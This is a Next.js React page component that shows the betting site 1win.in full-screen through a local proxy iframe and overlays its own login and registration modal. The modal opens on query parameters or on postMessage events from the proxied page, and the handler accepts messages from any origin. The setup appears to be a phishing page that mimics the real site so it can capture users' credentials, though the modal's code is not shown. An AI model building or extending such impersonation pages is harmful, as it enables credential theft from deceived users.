'use client';

import { useState, useEffect, useRef } from 'react';
import LoginModal from './login';

export default function Home() {
  const [modalOpen, setModalOpen] = useState(false);
  const [authMode, setAuthMode] = useState<'login' | 'register'>('login');
  const iframeRef = useRef<HTMLIFrameElement>(null);

  const openAuth = (mode: 'login' | 'register') => {
    setAuthMode(mode);
    setModalOpen(true);
  };

  // Expose helper on window for debugging or direct triggers
  useEffect(() => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    (window as any).openAuthModal = (mode: 'login' | 'register' = 'login') => {
      openAuth(mode);
    };

    // Auto-open if query params present
    const params = new URLSearchParams(window.location.search);
    const authQuery = params.get('auth') || params.get('mode') || params.get('open');
    if (authQuery === 'register' || authQuery === 'registration') {
      setTimeout(() => openAuth('register'), 0);
    } else if (authQuery === 'login') {
      setTimeout(() => openAuth('login'), 0);
    }
  }, []);

  // Listen for messages from the proxied page inside the iframe
  useEffect(() => {
    const handler = (e: MessageEvent) => {
      if (!e.data) return;
      if (
        e.data === 'open-login-modal' ||
        e.data.type === 'open-login-modal' ||
        e.data === 'login'
      ) {
        openAuth('login');
      } else if (
        e.data === 'open-register-modal' ||
        e.data.type === 'open-register-modal' ||
        e.data === 'register' ||
        e.data === 'registration'
      ) {
        openAuth('register');
      }
    };
    window.addEventListener('message', handler);
    return () => window.removeEventListener('message', handler);
  }, []);

  return (
    <>
      {/* Full-viewport iframe showing the proxied 1win.in site */}
      <iframe
        ref={iframeRef}
        src="/api/proxy?url=https://1win.in"
        style={{
          position: 'fixed',
          inset: 0,
          width: '100%',
          height: '100%',
          border: 'none',
          zIndex: 1,
        }}
        title="1win"
      />

      {/* Unified Login & Registration Overlay Modal */}
      <LoginModal
        isOpen={modalOpen}
        onClose={() => setModalOpen(false)}
        initialMode={authMode}
      />
    </>
  );
}
